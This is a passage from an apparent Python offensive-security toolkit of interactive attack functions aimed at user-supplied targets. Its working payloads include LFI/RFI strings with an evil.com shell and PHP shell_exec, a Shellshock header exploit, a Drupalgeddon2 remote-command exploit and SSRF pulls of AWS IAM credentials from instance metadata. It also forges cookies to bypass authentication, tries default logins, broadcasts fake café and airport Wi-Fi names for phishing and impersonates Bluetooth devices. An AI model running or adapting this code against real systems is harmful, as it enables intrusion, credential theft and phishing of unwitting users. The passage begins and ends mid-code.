        param = input("Enter parameter name: ")
        
        lfi_payloads = [
            '../../../../../../etc/passwd',
            '../../../../../../windows/win.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        rfi_payloads = [
            'http://evil.com/shell.txt',
            '\\\\evil.com\\share\\shell.txt',
            'data:text/plain,<?php echo shell_exec("id"); ?>'
        ]
        
        print("Testing for LFI/RFI vulnerabilities...")
        
        try:
            for payload in lfi_payloads:
                test_url = f"{url}?{param}={payload}"
                response = requests.get(test_url, timeout=5)
                
                if 'root:' in response.text or '[extensions]' in response.text:
                    print("[+] Possible LFI vulnerability")
                    print(f"Payload: {payload}")
                    print("File contents:")
                    print(response.text[:500] + "...")
                    return
            
            for payload in rfi_payloads:
                test_url = f"{url}?{param}={payload}"
                try:
                    response = requests.get(test_url, timeout=5)
                    
                    if 'uid=' in response.text:
                        print("[+] Possible RFI vulnerability")
                        print(f"Payload: {payload}")
                        print("Command output:")
                        print(response.text[:500] + "...")
                        return
                except:
                    continue
            
            print("[-] No LFI/RFI vulnerabilities found")
        except Exception as e:
            print(f"Error: {e}")

    def honeypot_detect(self):
        ip = input("Enter IP address to check: ")
        try:
            print(f"Checking {ip} for honeypot indicators...")
            
            nm = nmap.PortScanner()
            nm.scan(ip, arguments='-T4 -F')
            
            if len(nm[ip]['tcp']) > 10:
                print("[+] High number of open ports - possible honeypot")
            
            if 22 in nm[ip]['tcp'] and nm[ip]['tcp'][22]['state'] == 'open':
                print("[+] SSH port open - checking response time...")
                start_time = time.time()
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((ip, 22))
                sock.recv(1024)
                elapsed = time.time() - start_time
                sock.close()
                
                if elapsed < 0.1:
                    print("[+] Instant SSH response - possible honeypot")
            
            print("[-] No definitive honeypot indicators found")
        except Exception as e:
            print(f"Error: {e}")

    def cache_poisoning(self):
        url = input("Enter target URL: ")
        headers = {
            'X-Forwarded-Host': 'evil.com',
            'Host': 'evil.com'
        }
        
        print("Testing for web cache poisoning...")
        
        try:
            response = requests.get(url, headers=headers, timeout=5)
            
            if 'evil.com' in response.text:
                print("[+] Cache poisoning possible via Host header")
                print("Check if response is cached by CDN/proxy")
            else:
                print("[-] No obvious cache poisoning vectors")
        except Exception as e:
            print(f"Error: {e}")

    def ip_history(self):
        domain = input("Enter domain to check IP history: ")
        try:
            print(f"Checking historical IPs for {domain}...")
            
            result = subprocess.run(['curl', '-s', f'https://viewdns.info/iphistory/?domain={domain}'], capture_output=True, text=True)
            
            if 'No historical IP information' not in result.stdout:
                print("[+] Historical IPs found:")
                print(result.stdout)
            else:
                print("[-] No historical IP information available")
        except Exception as e:
            print(f"Error: {e}")

    def favicon_hash(self):
        url = input("Enter target URL: ")
        try:
            response = requests.get(url + '/favicon.ico', timeout=5)
            
            if response.status_code == 200:
                favicon = response.content
                md5 = hashlib.md5(favicon).hexdigest()
                
                print(f"[+] Favicon MD5 hash: {md5}")
                print("Search for this hash in Shodan to find similar servers")
            else:
                print("[-] Could not retrieve favicon")
        except Exception as e:
            print(f"Error: {e}")

    def github_token_scan(self):
        repo_url = input("Enter GitHub repo URL: ")
        try:
            print(f"Scanning {repo_url} for secrets...")
            
            patterns = {
                'AWS Key': r'AKIA[0-9A-Z]{16}',
                'Google API Key': r'AIza[0-9A-Za-z\\-_]{35}',
                'GitHub Token': r'ghp_[a-zA-Z0-9]{36}',
                'Slack Token': r'xox[baprs]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}',
                'SSH Private Key': r'-----BEGIN (RSA|DSA|EC|OPENSSH) PRIVATE KEY-----'
            }
            
            result = subprocess.run(['git', 'clone', repo_url, 'temp_repo'], capture_output=True, text=True)
            
            if result.returncode == 0:
                for root, dirs, files in os.walk('temp_repo'):
                    for file in files:
                        try:
                            with open(os.path.join(root, file), 'r', encoding='utf-8', errors='ignore') as f:
                                content = f.read()
                                for name, pattern in patterns.items():
                                    matches = re.findall(pattern, content)
                                    if matches:
                                        print(f"\n[+] Found {name} in {file}")
                                        for match in matches[:3]:
                                            print(f"  {match}")
                        except:
                            continue
                
                subprocess.run(['rm', '-rf', 'temp_repo'])
            else:
                print("[-] Could not clone repository")
        except Exception as e:
            print(f"Error: {e}")

    def email_verify(self):
        email = input("Enter email address to verify: ")
        try:
            domain = email.split('@')[1]
            
            print(f"Verifying {email}...")
            
            mx_records = dns.resolver.resolve(domain, 'MX')
            mx_host = str(mx_records[0].exchange)
            
            print(f"[+] MX record found: {mx_host}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((mx_host, 25))
            sock.recv(1024)
            
            sock.send(b'HELO example.com\r\n')
            sock.recv(1024)
            
            sock.send(f'MAIL FROM: <test@example.com>\r\n'.encode())
            sock.recv(1024)
            
            sock.send(f'RCPT TO: <{email}>\r\n'.encode())
            response = sock.recv(1024).decode()
            
            if '250' in response:
                print("[+] Email address exists")
            else:
                print("[-] Email address does not exist")
            
            sock.close()
        except Exception as e:
            print(f"Error: {e}")

    def js_sourcemap(self):
        url = input("Enter target URL with .map file: ")
        try:
            if not url.endswith('.map'):
                url = url + '.map'
            
            response = requests.get(url, timeout=5)
            
            if response.status_code == 200:
                print("[+] Source map found - extracting sources...")
                sourcemap = response.json()
                
                if 'sources' in sourcemap:
                    print("\nFound sources:")
                    for source in sourcemap['sources'][:10]:
                        print(source)
                    
                    if 'sourcesContent' in sourcemap:
                        print("\nSample source content:")
                        print(sourcemap['sourcesContent'][0][:500] + "...")
            else:
                print("[-] No source map found")
        except Exception as e:
            print(f"Error: {e}")

    def cf_misconfig(self):
        url = input("Enter target URL behind Cloudflare: ")
        try:
            print("Checking for Cloudflare misconfigurations...")
            
            response = requests.get(url, timeout=5)
            headers = response.headers
            
            if 'server' in headers and 'cloudflare' in headers['server'].lower():
                print("[+] Site is behind Cloudflare")
                
                ip = socket.gethostbyname(url.split('/')[2])
                print(f"Original IP: {ip}")
                
                if 'cf-ray' not in headers:
                    print("[!] Missing CF-Ray header - possible misconfiguration")
                
                if 'access-control-allow-origin' in headers and headers['access-control-allow-origin'] == '*':
                    print("[!] Overly permissive CORS policy")
            else:
                print("[-] Site does not appear to be behind Cloudflare")
        except Exception as e:
            print(f"Error: {e}")

    def pw_reset_workflow(self):
        url = input("Enter target password reset URL: ")
        try:
            print("Analyzing password reset workflow...")
            
            response = requests.get(url, timeout=5)
            
            if 'password' in response.text.lower() or 'reset' in response.text.lower():
                print("[+] Password reset page found")
                
                email = 'test@example.com'
                data = {'email': email}
                
                reset_response = requests.post(url, data=data, timeout=5)
                
                if reset_response.status_code == 200:
                    print("[+] Password reset request submitted")
                    
                    if 'sent' in reset_response.text.lower() or 'email' in reset_response.text.lower():
                        print("[!] Check for token leakage in response or email")
                    else:
                        print("[!] Check for direct reset without email verification")
            else:
                print("[-] Could not identify password reset functionality")
        except Exception as e:
            print(f"Error: {e}")

    def error_fuzzer(self):
        url = input("Enter target URL: ")
        fuzz_strings = [
            "'",
            "\"",
            "%27",
            "%22",
            "<script>",
            "../../../etc/passwd",
            "{{7*7}}"
        ]
        
        print("Fuzzing for error messages...")
        
        for fuzz in fuzz_strings:
            try:
                test_url = f"{url}?test={fuzz}"
                response = requests.get(test_url, timeout=5)
                
                if 'error' in response.text.lower() or 'exception' in response.text.lower():
                    print(f"[+] Error triggered with payload: {fuzz}")
                    print("Error message:")
                    print(response.text[:500] + "...")
                    return
            except Exception as e:
                print(f"Error testing payload {fuzz}: {e}")
        
        print("[-] No obvious error messages triggered")

    def open_hotspot(self):
        print("Scanning for open Wi-Fi hotspots...")
        try:
            result = subprocess.run(['nmcli', 'dev', 'wifi'], capture_output=True, text=True)
            
            if result.returncode == 0:
                lines = result.stdout.split('\n')
                for line in lines[1:]:
                    if line.strip():
                        parts = line.split()
                        ssid = ' '.join(parts[1:-7])
                        security = parts[-2]
                        
                        if security == '--':
                            print(f"[+] Found open network: {ssid}")
            else:
                print("[-] Could not scan for Wi-Fi networks")
        except Exception as e:
            print(f"Error: {e}. Make sure nmcli is installed.")

    def phishing_bait(self):
        print("Broadcasting common SSIDs...")
        try:
            common_ssids = [
                'Starbucks',
                'xfinitywifi',
                'Google Starbucks',
                'ATT Wi-Fi',
                'Airport_Free_WiFi'
            ]
            
            for ssid in common_ssids:
                print(f"[+] Broadcasting {ssid}")
                subprocess.Popen(['iwconfig', 'wlan0', 'essid', ssid, 'mode', 'adhoc'])
        except Exception as e:
            print(f"Error: {e}")

    def ble_impersonation(self):
        print("Starting BLE impersonation...")
        try:
            target = input("Enter target BLE MAC address: ")
            name = input("Enter device name to impersonate: ")
            
            print(f"[+] Impersonating {name} ({target})")
            subprocess.run(['hcitool', 'cmd', '0x08', '0x0008', name])
        except Exception as e:
            print(f"Error: {e}. Make sure bluez is installed.")

    def zigbee_scan(self):
        print("Scanning for Zigbee devices...")
        try:
            result = subprocess.run(['sudo', 'zbwardrive', '-i', 'wlan0'], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure zbwardrive is installed.")

    def wifi_frame_analyzer(self):
        print("Analyzing Wi-Fi management frames...")
        try:
            subprocess.run(['tcpdump', '-i', 'wlan0', '-e', '-s', '256', 'type mgt'], capture_output=True, text=True)
        except Exception as e:
            print(f"Error: {e}. Make sure tcpdump is installed.")

    def archived_robots(self):
        domain = input("Enter domain to check: ")
        try:
            print(f"Checking archived robots.txt for {domain}...")
            
            response = requests.get(f'https://web.archive.org/web/{domain}/robots.txt', timeout=10)
            
            if response.status_code == 200:
                print("[+] Found archived robots.txt:")
                print(response.text)
            else:
                print("[-] No archived robots.txt found")
        except Exception as e:
            print(f"Error: {e}")

    def phone_intel(self):
        phone = input("Enter phone number (with country code): ")
        try:
            print(f"Looking up information for {phone}...")
            
            response = requests.get(f'https://api.numlookupapi.com/v1/validate/{phone}?apikey=free', timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                print(f"\nCountry: {data.get('country_name')}")
                print(f"Carrier: {data.get('carrier')}")
                print(f"Line type: {data.get('line_type')}")
            else:
                print("[-] Could not lookup phone number")
        except Exception as e:
            print(f"Error: {e}")

    def techstack_profile(self):
        url = input("Enter target URL: ")
        try:
            print("Profiling technology stack...")
            
            response = requests.get(url, timeout=5)
            headers = response.headers
            content = response.text
            
            tech = {
                'Web Server': headers.get('server', ''),
                'Programming Language': '',
                'JavaScript Frameworks': [],
                'CMS': '',
                'Database': ''
            }
            
            if 'X-Powered-By' in headers:
                tech['Programming Language'] = headers['X-Powered-By']
            
            if 'wp-content' in content:
                tech['CMS'] = 'WordPress'
            elif 'Joomla' in content:
                tech['CMS'] = 'Joomla'
            elif 'Drupal' in content:
                tech['CMS'] = 'Drupal'
            
            if 'jquery' in content.lower():
                tech['JavaScript Frameworks'].append('jQuery')
            if 'react' in content.lower():
                tech['JavaScript Frameworks'].append('React')
            if 'angular' in content.lower():
                tech['JavaScript Frameworks'].append('Angular')
            if 'vue' in content.lower():
                tech['JavaScript Frameworks'].append('Vue.js')
            
            print("\nDetected technologies:")
            for category, value in tech.items():
                if value:
                    print(f"{category}: {value if not isinstance(value, list) else ', '.join(value)}")
        except Exception as e:
            print(f"Error: {e}")

    def avatar_matcher(self):
        username = input("Enter username to check: ")
        try:
            print(f"Searching for avatars for {username}...")
            
            sites = {
                'GitHub': f'https://github.com/{username}',
                'Twitter': f'https://twitter.com/{username}',
                'Reddit': f'https://reddit.com/user/{username}'
            }
            
            avatars = {}
            
            for site, url in sites.items():
                try:
                    response = requests.get(url, timeout=5)
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        if site == 'GitHub':
                            img = soup.find('img', {'alt': 'Avatar'})
                            if img:
                                avatars[site] = img['src']
                        elif site == 'Twitter':
                            img = soup.find('img', {'alt': username})
                            if img:
                                avatars[site] = img['src']
                        elif site == 'Reddit':
                            img = soup.find('img', {'alt': 'User avatar'})
                            if img:
                                avatars[site] = img['src']
                except:
                    continue
            
            if avatars:
                print("\nFound avatars:")
                for site, url in avatars.items():
                    print(f"{site}: {url}")
            else:
                print("[-] No avatars found")
        except Exception as e:
            print(f"Error: {e}")

    def typosquat_check(self):
        domain = input("Enter domain to check: ")
        try:
            print(f"Generating typosquatting variants for {domain}...")
            
            tlds = ['.com', '.net', '.org', '.io']
            variants = []
            
            for i in range(len(domain)):
                if domain[i] != '.':
                    variants.append(domain[:i] + domain[i+1:])
                    variants.append(domain[:i] + domain[i] + domain[i] + domain[i+1:])
                    if i > 0:
                        variants.append(domain[:i-1] + domain[i] + domain[i-1] + domain[i+1:])
            
            for tld in tlds:
                if domain.endswith(tld):
                    base = domain[:-len(tld)]
                    variants.append(base + tld[1:] + tld[0])
                    variants.append(base[:-1] + tld)
                    break
            
            print("\nGenerated variants:")
            for var in set(variants[:20]):
                print(var)
        except Exception as e:
            print(f"Error: {e}")

    def payload_encoder(self):
        payload = input("Enter payload to encode: ")
        print("\nEncoded payloads:")
        
        print(f"\nURL encoded: {urllib.parse.quote(payload)}")
        print(f"Double URL encoded: {urllib.parse.quote(urllib.parse.quote(payload))}")
        print(f"Base64 encoded: {base64.b64encode(payload.encode()).decode()}")
        print(f"Hex encoded: {payload.encode().hex()}")
        print(f"Unicode escaped: {payload.encode('unicode_escape').decode()}")

    def file_signature(self):
        file_path = input("Enter file path: ")
        try:
            with open(file_path, 'rb') as f:
                header = f.read(4)
                print(f"File signature (magic bytes): {header.hex()}")
        except Exception as e:
            print(f"Error: {e}")

    def sqlite_viewer(self):
        db_path = input("Enter SQLite database path: ")
        try:
            print(f"Reading SQLite database {db_path}...")
            
            result = subprocess.run(['sqlite3', db_path, '.tables'], capture_output=True, text=True)
            tables = result.stdout.split()
            
            print("\nTables in database:")
            for table in tables:
                print(f"\n{table}:")
                subprocess.run(['sqlite3', db_path, f'SELECT * FROM {table} LIMIT 5'], timeout=5)
        except Exception as e:
            print(f"Error: {e}. Make sure sqlite3 is installed.")

    def header_injector(self):
        url = input("Enter target URL: ")
        headers = {}
        
        print("Enter headers to inject (key:value, empty to finish):")
        while True:
            header = input("> ")
            if not header:
                break
            if ':' in header:
                key, value = header.split(':', 1)
                headers[key.strip()] = value.strip()
        
        try:
            print(f"Sending request with custom headers to {url}...")
            response = requests.get(url, headers=headers, timeout=5)
            
            print("\nResponse:")
            print(f"Status code: {response.status_code}")
            print("Headers:")
            for key, value in response.headers.items():
                print(f"{key}: {value}")
        except Exception as e:
            print(f"Error: {e}")

    def shellshock_test(self):
        url = input("Enter target CGI URL: ")
        payload = '() { :;}; echo; echo; /bin/bash -c "id"'
        
        print("Testing for Shellshock (CVE-2014-6271)...")
        
        try:
            headers = {
                'User-Agent': payload,
                'Referer': payload,
                'Cookie': f'test={payload}'
            }
            
            response = requests.get(url, headers=headers, timeout=5)
            
            if 'uid=' in response.text:
                print("[+] Vulnerable to Shellshock")
                print("Command output:")
                print(response.text[:500] + "...")
            else:
                print("[-] Not vulnerable to Shellshock")
        except Exception as e:
            print(f"Error: {e}")

    def cve_autoscan(self):
        cve = input("Enter CVE ID (e.g. CVE-2019-0708): ")
        print(f"Searching for exploit for {cve}...")
        
        try:
            result = subprocess.run(['searchsploit', cve], capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}. Make sure exploitdb is installed.")

    def drupalgeddon2(self):
        url = input("Enter Drupal site URL: ")
        try:
            print("Testing for Drupalgeddon2 (CVE-2018-7600)...")
            
            payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'id'}
            
            response = requests.post(url + '/user/register', data=payload, timeout=10)
            
            if 'uid=' in response.text:
                print("[+] Vulnerable to Drupalgeddon2")
                print("Command output:")
                print(response.text[:500] + "...")
            else:
                print("[-] Not vulnerable to Drupalgeddon2")
        except Exception as e:
            print(f"Error: {e}")

    def ssrf_test(self):
        url = input("Enter target URL with parameter to test: ")
        param = input("Enter parameter name: ")
        
        test_urls = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost',
            'file:///etc/passwd'
        ]
        
        print("Testing for SSRF vulnerabilities...")
        
        for test in test_urls:
            try:
                test_url = f"{url}?{param}={test}"
                response = requests.get(test_url, timeout=5)
                
                if 'amazonaws.com' in response.text or 'localhost' in response.text or 'root:' in response.text:
                    print(f"[+] Possible SSRF via {param}")
                    print("Response:")
                    print(response.text[:500] + "...")
                    return
            except Exception as e:
                print(f"Error testing {test}: {e}")
        
        print("[-] No SSRF vulnerabilities found")

    def aws_metadata(self):
        url = input("Enter target URL with SSRF vulnerability: ")
        param = input("Enter vulnerable parameter name: ")
        
        endpoints = [
            'latest/meta-data/',
            'latest/meta-data/iam/security-credentials/',
            'latest/user-data/',
            'latest/dynamic/instance-identity/document'
        ]
        
        print("Attempting to access AWS metadata...")
        
        for endpoint in endpoints:
            try:
                test_url = f"{url}?{param}=http://169.254.169.254/{endpoint}"
                response = requests.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    print(f"[+] Found AWS metadata at {endpoint}")
                    print("Contents:")
                    print(response.text[:500] + "...")
                    return
            except Exception as e:
                print(f"Error accessing {endpoint}: {e}")
        
        print("[-] Could not access AWS metadata")

    def broken_auth(self):
        url = input("Enter target login URL: ")
        try:
            print("Testing for broken authentication...")
            
            response = requests.get(url, timeout=5)
            
            if 'login' in response.text.lower() or 'password' in response.text.lower():
                print("[+] Login page found")
                
                test_cookies = [
                    {'admin': 'true'},
                    {'authenticated': 'true'},
                    {'role': 'admin'}
                ]
                
                for cookie in test_cookies:
                    test_response = requests.get(url, cookies=cookie, timeout=5)
                    
                    if 'logout' in test_response.text.lower() or 'welcome' in test_response.text.lower():
                        print(f"[+] Authentication bypass with cookie: {cookie}")
                        return
                
                print("[-] No simple authentication bypass found")
            else:
                print("[-] Could not identify login page")
        except Exception as e:
            print(f"Error: {e}")

    def auth_fuzzer(self):
        url = input("Enter target login URL: ")
        try:
            print("Fuzzing authentication logic...")
            
            test_params = [
                {'user': 'admin', 'password': 'password'},
                {'username': 'admin', 'pass': 'password'},
                {'email': 'admin@example.com', 'passwd': 'password'},
                {'login': 'admin', 'pwd': 'password'}
            ]
            
            for params in test_params:
                response = requests.post(url, data=params, timeout=5)
                
                if 'logout' in response.text.lower() or 'welcome' in response.text.lower():
                    print(f"[+] Possible authentication with default credentials: {params}")
                    return
            
            print("[-] No authentication bypass found")
        except Exception as e:
            print(f"Error: {e}")

    def http_method_test(self):
        url = input("Enter target URL: ")
        methods = ['PUT', 'DELETE', 'PATCH', 'CONNECT', 'TRACE']
        
        print("Testing HTTP methods...")
        
        for method in methods:
            try:
                response = requests.request(method, url, timeout=5)
                print(f"{method}: {response.status_code}")
            except Exception as e:
                print(f"{method}: Error - {e}")

    def cors_bypass(self):
        url = input("Enter target URL: ")
        origins = [
            'https://evil.com',
            'http://evil.com',
            'null',
            'https://attacker.com'
        ]
        
        print("Testing CORS misconfigurations...")
        
        for origin in origins:
            try:
                headers = {'Origin': origin}
                response = requests.get(url, headers=headers, timeout=5)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '')
                
                if origin == acao and acac == 'true':
                    print(f"[+] CORS misconfiguration - {origin} allowed with credentials")
                    return
                elif '*' == acao:
                    print("[+] CORS misconfiguration - any origin allowed")
                    return
            except Exception as e:
                print(f"Error testing {origin}: {e}")
        
        print("[-] No CORS misconfigurations found")

    def websocket_inject(self):
        url = input("Enter target WebSocket URL (ws:// or wss://): ")
        try:
            print("Testing WebSocket security...")
            
            ws = websocket.create_connection(url)
            
            test_payloads = [
                '{"test":"payload"}',
                '<script>alert(1)</script>',
                'admin'
            ]
            
            for payload in test_payloads:
                ws.send(payload)
                result = ws.recv()
                
                if payload in result:
                    print(f"[+] WebSocket injection possible with: {payload}")
                    return
            
            ws.close()
            print("[-] No WebSocket injection vulnerabilities found")
        except Exception as e:
            print(f"Error: {e}")

    def cors_misconfig(self):
        url = input("Enter target URL: ")
        try:
            print("Checking for CORS misconfigurations...")
            
            headers = {'Origin': 'https://evil.com'}
            response = requests.get(url, headers=headers, timeout=5)
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '')
            
            if acao == 'https://evil.com' and acac == 'true':
                print("[+] CORS misconfiguration - arbitrary origin allowed with credentials")
            elif acao == '*':
                print("[+] CORS misconfiguration - any origin allowed")
            else:
                print("[-] No CORS misconfigurations found")
        except Exception as e:
            print(f"Error: {e}")

    def api_fuzzer(self):
        base_url = input("Enter target API base URL: ")
        endpoints = [
            '/api/v1/users',
            '/api/v1/admin',
            '/api/v1/config',
            '/api/v1/keys',
            '/api/v1/tokens'
        ]
        
        print("Fuzzing API endpoints...")
        
        for endpoint in endpoints:
            try:
                response = requests.get(base_url + endpoint, timeout=5)
                
                if response.status_code == 200:
                    print(f"[+] Found API endpoint: {endpoint}")
                    print("Response:")
                    print(response.text[:500] + "...")
                elif response.status_code == 403:
                    print(f"[!] Access denied to {endpoint} - possible privilege escalation")
            except Exception as e:
                print(f"Error testing {endpoint}: {e}")

    def web_framework(self):
        url = input("Enter target URL: ")
        try:
            print("Detecting web framework...")
            
            response = requests.get(url, timeout=5)
            headers = response.headers
            content = response.text
            
            frameworks = {
                'Laravel': ['laravel', 'csrf-token'],
                'Ruby on Rails': ['rails', 'csrf-token'],
                'Django': ['django', 'csrftoken'],
                'Express': ['express', 'x-powered-by'],
                'ASP.NET': ['asp.net', 'x-powered-by']
            }
            
            detected = []
            
            for framework, indicators in frameworks.items():
                if indicators[1] in headers or indicators[0].lower() in content.lower():
                    detected.append(framework)
            
            if detected:
                print("[+] Detected frameworks:")
                for fw in detected:
                    print(f"  - {fw}")
            else:
                print("[-] Could not identify web framework")
        except Exception as e:
            print(f"Error: {e}")

    def vhost_enum(self):
        domain = input("Enter base domain: ")
        wordlist = input("Enter path to vhost wordlist (or press enter for default): ")
        
        if not wordlist:
            wordlist = "vhosts.txt"
            default_vhosts = ['dev', 'test', 'staging', 'api', 'admin', 'internal']
            with open(wordlist, 'w') as f:
                f.write("\n".join(default_vhosts))
        
        try:
            with open(wordlist, 'r') as f:
                vhosts = f.read().splitlines()
            
            print(f"Enumerating vhosts for {domain}...")
            
            for vhost in vhosts:
                try:
                    headers = {'Host': f"{vhost}.{domain}"}
                    response = requests.get(f"http://{domain}", headers=headers, timeout=5)
                    
                    if response.status_code == 200:
                        print(f"[+] Found vhost: {vhost}.{domain}")
                except Exception as e:
                    print(f"Error checking {vhost}: {e}")
        except Exception as e:
            print(f"Error: {e}")

    def js_dependency(self):
        url = input("Enter target URL: ")
        try:
            print("Analyzing JavaScript dependencies...")
            
            response = requests.get(url, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            scripts = soup.find_all('script', src=True)
            
            vulnerable = []
            
            for script in scripts:
                src = script['src']
                if not src.startswith('http'):
                    if src.startswith('//'):
                        src = 'https:' + src
                    elif src.startswith('/'):
                        src = url + src
                    else:
                        src = url + '/' + src
                
                try:
                    js_response = requests.get(src, timeout=5)
                    content = js_response.text
                    
                    version_matches = re.findall(r'v?\d+\.\d+\.\d+', content)
                    if version_matches:
                        print(f"\nScript: {src}")
                        print(f"Possible versions: {', '.join(set(version_matches))}")
                except:
                    continue
            
            print("\nNote: Check versions against known vulnerabilities")
        except Exception as e:
            print(f"Error: {e}")

    def historical_subdomains(self):
        domain = input("Enter domain: ")
        try:
            print(f"Checking historical subdomains for {domain}...")
            
            print("\nChecking crt.sh...")
            crt_url = f"https://crt.sh/?q=%25.{domain}&output=json"
            response = requests.get(crt_url, timeout=10)
            
            if response.status_code == 200:
                certificates = response.json()
                subdomains = set()
                
                for cert in certificates:
                    name = cert['name_value']
                    if '*' not in name and name.endswith(domain):
                        subdomains.add(name)
                
                print("\nFound historical subdomains:")
                for sub in sorted(subdomains):
                    print(sub)
            else:
                print("[-] Could not query crt.sh")
        except Exception as e:
            print(f"Error: {e}")

    def sitemap_extractor(self):
        url = input("Enter target URL: ")
        try:
            print("Extracting sitemap.xml and robots.txt...")
            
            robots = requests.get(url + '/robots.txt', timeout=5)
            if robots.status_code == 200:
                print("\nrobots.txt contents:")
                print(robots.text)
            else:
                print("[-] robots.txt not found")
            
            sitemap = requests.get(url + '/sitemap.xml', timeout=5)
            if sitemap.status_code == 200:
                print("\nsitemap.xml contents:")
                print(sitemap.text)
            else:
                print("[-] sitemap.xml not found")
        except Exception as e:
            print(f"Error: {e}")

    def waf_fingerprint(self):
        url = input("Enter target URL: ")
        try:
            print("Fingerprinting WAF...")
            
            response = requests.get(url, timeout=5)
            headers = response.headers
            server = headers.get('Server', '')
            
            wafs = {
                'Cloudflare': ['cloudflare', 'cf-ray'],
                'Akamai': ['akamai', 'akamaighost'],
                'AWS Shield': ['aws', 'x-amz-cf-pop'],
                'Imperva': ['imperva', 'incap_ses'],
                'ModSecurity': ['mod_security', 'mod_security']
            }
            
            detected = []
            
            for waf, indicators in wafs.items():
                if indicators[0].lower() in server.lower() or indicators[1].lower() in headers:
                    detected.append(waf)
            
            if detected:
                print("[+] Detected WAFs:")
                for waf in detected:
                    print(f"  - {waf}")
            else:
                print("[-] Could not identify WAF")
        except Exception as e:
            print(f"Error: {e}")

    def ua_feature_detect(self):
        url = input("Enter target URL: ")
        user_agents = {
            'Chrome': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'iPhone': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
            'Googlebot': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'
        }
        
        print("Testing for user-agent based feature differences...")
        
        try:
            responses = {}
            
            for name, ua in user_agents.items():
                headers = {'User-Agent': ua}
                response = requests.get(url, headers=headers, timeout=5)
                responses[name] = response.text
            
            if len(set(responses.values())) > 1:
                print("[+] Different responses detected for different user agents")
                print("Possible A/B testing or feature gating")
            else:
                print("[-] No user-agent based differences detected")
        except Exception as e:
            print(f"Error: {e}")

    def shared_hosting(self):
        url = input("Enter target URL: ")
        try:
            print("Checking for shared hosting...")
            
            domain = url.split('/')[2]
            ip = socket.gethostbyname(domain)
            
            print(f"\nIP address: {ip}")
            print("Running reverse IP lookup...")
            
            result = subprocess.run(['host', ip], capture_output=True, text=True)
            if result.returncode == 0:
                domains = result.stdout.split('\n')
                if len(domains) > 2:
                    print("[+] Shared hosting detected - other domains on this IP:")
                    for domain in domains[:5]:
                        print(domain.strip())
                else:
                    print("[-] No shared hosting detected")
            else:
                print("[-] Could not perform reverse IP lookup")
        except Exception as e:
            print(f"Error: {e}")

    def cname_chain(self):
        domain = input("Enter domain: ")
        try:
            print(f"Resolving CNAME chain for {domain}...")
            
            while True:
                answers = dns.resolver.resolve(domain, 'CNAME')
                for rdata in answers:
                    print(f"{domain} -> {rdata.target}")
                    domain = str(rdata.target)
                    if not domain.endswith('.'):
                        domain += '.'
                else:
                    break
        except Exception as e:
            print(f"End of CNAME chain: {e}")

    def admin_panel_finder(self):
        url = input("Enter target URL: ")
        common_paths = [
            '/admin',
            '/wp-admin',
            '/administrator',
            '/manage',
            '/cpanel',
            '/controlpanel',
            '/admin.php',
            '/admin/login',
            '/admincp',
            '/backend'
        ]
        
        print("Finding admin panels...")
        
        for path in common_paths:
            try:
                response = requests.get(url + path, timeout=5)
                
                if response.status_code == 200 and any(x in response.text.lower() for x in ['login', 'password', 'admin']):
                    print(f"[+] Found admin panel at {path}")
            except Exception as e:
                print(f"Error checking {path}: {e}")

    def port_knocking(self):
        ip = input("Enter target IP: ")
        sequences = [
            [7000, 8000, 9000],
            [1000, 2000, 3000],
            [1111, 2222, 3333]
        ]
        
        print("Testing port knocking sequences...")
        
        for seq in sequences:
            try:
                print(f"\nTrying sequence: {seq}")
                
                for port in seq:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect_ex((ip, port))
                    sock.close()
                
                time.sleep(1)
                
                print("Checking if new ports opened...")
                nm = nmap.PortScanner()
                nm.scan(ip, arguments='-T4 -F')
                
                if len(nm[ip]['tcp']) > 0:
                    print("[+] Port knocking successful - new ports open:")
                    for port in nm[ip]['tcp']:
                        print(f"Port {port}: {nm[ip]['tcp'][port]['state']}")
                    return
            except Exception as e:
                print(f"Error testing sequence: {e}")
        
        print("[-] No port knocking sequences worked")

    def ipv6_discovery(self):
        domain = input("Enter domain: ")
        try:
            print(f"Discovering IPv6 addresses for {domain}...")
            
            answers = dns.resolver.resolve(domain, 'AAAA')
            for rdata in answers:
                print(f"Found IPv6 address: {rdata.address}")
        except Exception as e:
            print(f"Error: {e}")

    def passive_dns(self):
        domain = input("Enter domain: ")
        try:
            print(f"Checking passive DNS for {domain}...")
            
            response = requests.get(f'https://api.sublist3r.com/search.php?domain={domain}', timeout=10)
            
            if response.status_code == 200:
                subdomains = response.json()
                print("\nFound subdomains:")
                for sub in subdomains:
                    print(sub)
            else:
                print("[-] Could not query passive DNS")
        except Exception as e:
            print(f"Error: {e}")

    def dnssec_scan(self):
        domain = input("Enter domain: ")
        try:
            print(f"Checking DNSSEC for {domain}...")
            
            result = subprocess.run(['dig', '+dnssec', domain, 'SOA'], capture_output=True, text=True)
            
            if 'RRSIG' in result.stdout:
                print("[+] DNSSEC enabled")
                print("Checking for validation issues...")
                
                val_result = subprocess.run(['delv', domain, 'A'], capture_output=True, text=True)
